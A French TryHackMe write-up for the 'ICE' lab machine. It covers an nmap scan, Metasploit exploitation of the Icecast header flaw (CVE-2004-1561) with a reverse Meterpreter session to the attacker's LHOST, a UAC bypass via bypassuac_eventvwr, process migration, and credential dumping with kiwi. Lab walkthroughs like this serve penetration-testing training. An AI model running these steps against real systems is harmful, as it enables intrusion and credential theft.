# 📌 Write-Up : Machine ICE - TryHackMe

## 🖥️ Informations Générales
- **Nom de la machine** : ICE
- **Difficulté** : Facile
- **Adresse IP** : *(variable selon l'instance TryHackMe)*
- **Outils utilisés** : `nmap`, `gobuster`, `metasploit`, `mimikatz`
- **Objectif** : Obtenir un accès root et récupérer les flags

---

## 🕵️ Reconnaissance

### 🔎 Scan des ports avec Nmap

Ajout de la machine à `/etc/hosts` :
```bash
echo "10.10.165.196 ice" | sudo tee -a /etc/hosts
```

Scan des services :
```bash
nmap -sC -sV -oN nmap/initial ice
```

📌 Résultat pertinent :
```
PORT     STATE SERVICE
8000/tcp open  http Icecast streaming media server
135/tcp  open  msrpc Microsoft Windows RPC
139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

Le port **8000** correspond à **Icecast**, un serveur de streaming.

---

## 🌍 Exploitation

### 📌 Vulnérabilité Icecast (CVE-2004-1561)

Dans Metasploit :
```bash
msfconsole
search icecast
use exploit/windows/http/icecast_header
set RHOSTS <ip_tryhackme>
set RPORT 8000
set LHOST <votre_ip_tun0>
set LPORT 4444
run
```

🎯 **Résultat** : Session Meterpreter obtenue !

---

## 🛠️ Escalade de Privilèges

### 🔑 Vérification des privilèges
```bash
getuid
sysinfo
```

### 📌 Exploits locaux
```bash
run post/multi/recon/local_exploit_suggester
```

Sélection de l'exploit `bypassuac_eventvwr` :
```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set LHOST <votre_ip_tun0>
run
```

Vérification :
```bash
getprivs
```

---

## 🎯 Post-Exploitation

### 📂 Migration de Processus
```bash
ps
migrate -N spoolsv.exe
```

### 🔑 Récupération des Identifiants
```bash
load kiwi
creds_all
```

---

## 🎉 Conclusion
- ✅ Scan initial avec **Nmap**
- ✅ Exploitation avec **Metasploit** (Icecast RCE)
- ✅ Escalade de privilèges avec **BypassUAC**
- ✅ Extraction de credentials avec **Kiwi**

🚀 **Machine compromise avec succès !**
